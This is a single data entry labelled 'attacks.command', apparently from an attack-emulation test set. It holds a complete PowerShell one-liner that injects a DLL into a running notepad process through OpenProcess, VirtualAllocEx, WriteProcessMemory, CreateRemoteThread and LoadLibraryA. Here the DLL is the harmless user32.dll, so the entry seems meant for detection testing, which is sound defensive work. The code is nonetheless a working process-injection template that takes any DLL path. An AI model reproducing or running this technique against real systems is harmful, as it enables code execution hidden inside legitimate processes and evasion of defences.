attacks.command:
powershell -Command '$dll = "C:\Windows\System32\user32.dll"; $proc = Get-Process notepad -ErrorAction SilentlyContinue; if (-not $proc) { Start-Process notepad; Start-Sleep -Seconds 2; $proc = Get-Process notepad }; $pid = $proc.Id; $code = @"
using System;
using System.Runtime.InteropServices;
public class Injector {
    [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError=true)] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr GetModuleHandle(string lpModuleName);
}
"@; Add-Type $code -PassThru | Out-Null; $procHandle = [Injector]::OpenProcess(0x001F0FFF, $false, $pid); $loadLibAddr = [Injector]::GetProcAddress([Injector]::GetModuleHandle("kernel32.dll"), "LoadLibraryA"); $dllBytes = [System.Text.Encoding]::ASCII.GetBytes($dll + "`0"); $allocMem = [Injector]::VirtualAllocEx($procHandle, [IntPtr]::Zero, $dllBytes.Length, 0x1000, 0x40); $bytesWritten = [IntPtr]::Zero; [Injector]::WriteProcessMemory($procHandle, $allocMem, $dllBytes, $dllBytes.Length, [ref]$bytesWritten) | Out-Null; [Injector]::CreateRemoteThread($procHandle, [IntPtr]::Zero, 0, $loadLibAddr, $allocMem, 0, [IntPtr]::Zero) | Out-Null;'
